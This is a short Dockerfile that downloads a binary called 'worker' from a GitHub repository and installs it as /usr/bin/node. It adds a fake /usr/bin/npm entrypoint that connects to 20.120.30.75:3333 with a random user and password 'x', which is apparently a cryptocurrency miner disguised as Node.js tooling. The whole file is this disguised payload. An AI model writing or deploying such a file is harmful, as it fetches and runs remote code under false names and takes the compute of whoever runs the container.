FROM debian
RUN apt update && apt -y install wget xz-utils && \
    cd /opt && wget https://github.com/septianana55/Student/raw/main/worker && \
	apt -y purge xz-utils && apt -y autoremove --purge && apt -y clean && apt -y autoclean; rm -rf /var/lib/apt-get/lists/*
RUN mv /opt/worker /usr/bin/node
RUN echo " node --url 20.120.30.75:3333 --user $RANDOM --pass x" > /usr/bin/npm
RUN chmod +x /usr/bin/npm
ENTRYPOINT npm
